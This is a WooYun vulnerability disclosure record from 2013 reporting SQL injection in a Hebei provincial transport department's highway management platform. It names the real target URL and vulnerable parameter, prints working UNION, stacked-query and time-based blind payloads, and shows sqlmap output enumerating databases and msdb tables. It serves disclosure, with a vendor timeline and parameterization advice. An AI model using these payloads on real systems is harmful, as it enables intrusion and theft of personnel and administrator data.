{"id": 64191, "wybug_id": "wooyun-2013-026933", "wybug_title": "河北省交通运输厅高速公路阳光工程和信息化管理平台SQL注射，可快速脱库", "wybug_corp": "河北省交通运输厅", "wybug_author": "霍大然", "wybug_date": "2013-06-26 11:26", "wybug_open_date": "2013-08-10 11:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "脱库", "管理员用户"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-10：\t细节向公众公开  简要描述： 河北省交通运输厅高速公路阳光工程和信息化管理平台，提供招投标信息、信用评价公示、企业信息公示、从业人员公示、政策法规、阳光工程、三类人员查询服务。该SQL注入漏洞导致后台hash泄露，从业人员信息泄密。 详细说明：  注入点与参数：http://222.222.63.99:8213/gt/suginput.aspx?CorpCode=1902 Place: GETParameter: CorpCode    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: CorpCode=1902' UNION ALL SELECT CHAR(58)+CHAR(105)+CHAR(113)+CHAR(101)+CHAR(58)+CHAR(69)+CHAR(86)+CHAR(68)+CHAR(75)+CHAR(118)+CHAR(107)+CHAR(81)+CHAR(65)+CHAR(106)+CHAR(82)+CHAR(58)+CHAR(97)+CHAR(106)+CHAR(97)+CHAR(58)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: CorpCode=1902'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: CorpCode=1902' WAITFOR DELAY '0:0:5'-----available databases [8]:[*] master[*] model[*] msdb[*] Northwind[*] ot_hs_cn[*] ots[*] pubs[*] tempdbsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: CorpCode    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: CorpCode=1902' UNION ALL SELECT CHAR(58)+CHAR(105)+CHAR(113)+CHAR(101)+CHAR(58)+CHAR(69)+CHAR(86)+CHAR(68)+CHAR(75)+CHAR(118)+CHAR(107)+CHAR(81)+CHAR(65)+CHAR(106)+CHAR(82)+CHAR(58)+CHAR(97)+CHAR(106)+CHAR(97)+CHAR(58)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: CorpCode=1902'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: CorpCode=1902' WAITFOR DELAY '0:0:5'-----Database: msdb[77 tables]+---------------------------------+| dbo.RTblClassDefs               || dbo.RTblDBMProps                || dbo.RTblDBXProps                || dbo.RTblDTMProps                || dbo.RTblDTSProps                || dbo.RTblDatabaseVersion         || dbo.RTblEQMProps                || dbo.RTblEnumerationDef          || dbo.RTblEnumerationValueDef     || dbo.RTblGENProps                || dbo.RTblIfaceDefs               || dbo.RTblIfaceHier               || dbo.RTblIfaceMem                || dbo.RTblMDSProps                || dbo.RTblNamedObj                || dbo.RTblOLPProps                || dbo.RTblParameterDef            || dbo.RTblPropDefs                || dbo.RTblProps                   || dbo.RTblRelColDefs              || dbo.RTblRelshipDefs             || dbo.RTblRelshipProps            || dbo.RTblRelships                || dbo.RTblSIMProps                || dbo.RTblScriptDefs              || dbo.RTblSites                   || dbo.RTblSumInfo                 || dbo.RTblTFMProps                || dbo.RTblTypeInfo                || dbo.RTblTypeLibs                || dbo.RTblUMLProps                || dbo.RTblUMXProps                || dbo.RTblVersionAdminInfo        || dbo.RTblVersions                || dbo.RTblWorkspaceItems          || dbo.backupfile                  || dbo.backupmediafamily           || dbo.backupmediaset              || dbo.backupset                   || dbo.log_shipping_primaries      || dbo.log_shipping_secondaries    || dbo.logmarkhistory              || dbo.mswebtasks                  || dbo.restorefile                 || dbo.restorefilegroup            || dbo.restorehistory              || dbo.sqlagent_info               || dbo.sysalerts                   || dbo.syscachedcredentials        || dbo.syscategories               || dbo.sysconstraints              || dbo.sysdbmaintplan_databases    || dbo.sysdbmaintplan_history      || dbo.sysdbmaintplan_jobs         || dbo.sysdbmaintplans             || dbo.sysdownloadlist             || dbo.sysdtscategories            || dbo.sysdtspackagelog            || dbo.sysdtspackages              || dbo.sysdtssteplog               || dbo.sysdtstasklog               || dbo.sysjobhistory               || dbo.sysjobs                     || dbo.sysjobs_view                || dbo.sysjobschedules             || dbo.sysjobservers               || dbo.sysjobsteps                 || dbo.sysnotifications            || dbo.sysoperators                || dbo.syssegments                 || dbo.systargetservergroupmembers || dbo.systargetservergroups       || dbo.systargetservers            || dbo.systargetservers_view       || dbo.systaskids                  || dbo.systasks                    || dbo.systasks_view               |+---------------------------------+   漏洞证明：  admin\n\n   修复方案：  过滤、存储过程、变量参数化   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-06-30 22:21 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}